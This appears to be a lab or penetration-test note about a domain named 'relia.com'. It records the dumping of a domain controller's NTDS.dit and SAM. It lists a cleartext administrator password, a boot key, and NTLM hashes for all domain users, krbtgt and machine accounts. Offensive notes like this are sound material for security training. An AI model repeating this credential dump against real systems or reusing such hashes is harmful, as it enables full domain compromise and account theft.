We are already administrator using these creds:


We will extract NTDS.dit.
Extracted info:

Internal admin is the the administrator of all DC chain:
relia.com\internaladmin:65a883e27cc4714738dfe4dce95001db
```sh
Administrator:vau!XCKjNQBv2$
```

```sh
[*] Target system bootKey: 0x5134f539f916174432bd178912ae1162
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec341e4a24f0f7db215b90f14f6e12b5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: edaf25649d0adf3d5e4590112617f832
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:60446f9e333abfda8c548cbe11daedc2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:aa17275b9987599e0a13b44ebd95dabb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b896b5f9c769cd04d97008292674c1a5:::
relia.com\maildmz:1103:aad3b435b51404eeaad3b435b51404ee:ddbe308ff30d828d484098d1c75c6166:::
relia.com\jim:1104:aad3b435b51404eeaad3b435b51404ee:be5cb823ee026304b6ed0cd356e34a3c:::
relia.com\michelle:1105:aad3b435b51404eeaad3b435b51404ee:18d4098c8d9ff721745b388ad4a442bf:::
relia.com\andrea:1106:aad3b435b51404eeaad3b435b51404ee:ce3f12443651168b3793f5fbcccff9db:::
relia.com\mountuser:1107:aad3b435b51404eeaad3b435b51404ee:6a2f774420368de1567dea28ab0d3988:::
relia.com\iis_service:1108:aad3b435b51404eeaad3b435b51404ee:bb4136aaa06fe1688b300e2f9243e85b:::
relia.com\internaladmin:1109:aad3b435b51404eeaad3b435b51404ee:65a883e27cc4714738dfe4dce95001db:::
relia.com\larry:1110:aad3b435b51404eeaad3b435b51404ee:47995d3e82d8e698f9b1a9d78c90aa7e:::
relia.com\jenny:1111:aad3b435b51404eeaad3b435b51404ee:5ef6ddc308ac24d5423c0b983eee159c:::
relia.com\brad:1113:aad3b435b51404eeaad3b435b51404ee:970ba7d4c92f712d0363706d6144c058:::
relia.com\anna:1114:aad3b435b51404eeaad3b435b51404ee:f79bec80e693e632f973d32b3489af18:::
MAIL$:1119:aad3b435b51404eeaad3b435b51404ee:67a5f07db44dad0004f91f31294ee694:::
LOGIN$:1120:aad3b435b51404eeaad3b435b51404ee:c330e35a37026b0a953545d961502d65:::
WK01$:1121:aad3b435b51404eeaad3b435b51404ee:403b8579d60d21b0413a0dabea6ac26e:::
WK02$:1122:aad3b435b51404eeaad3b435b51404ee:aeaecc31d573d8bed5c4f828cc70285e:::
relia.com\dan:1123:aad3b435b51404eeaad3b435b51404ee:4b22394fc907bd7a74d1af6cc9aca348:::
relia.com\milana:1124:aad3b435b51404eeaad3b435b51404ee:2237ff5905ec2fd9ebbdfa3a14d1b2b6:::
INTRANET$:1125:aad3b435b51404eeaad3b435b51404ee:9e74a35f01b05a7ad59ef083e9223ac3:::
FILES$:1126:aad3b435b51404eeaad3b435b51404ee:70b58ccbd1023a26f8bc2e52f5f16323:::
WEBBY$:1127:aad3b435b51404eeaad3b435b51404ee:f378514d1e5e428da3303a1fe36e7696:::


```
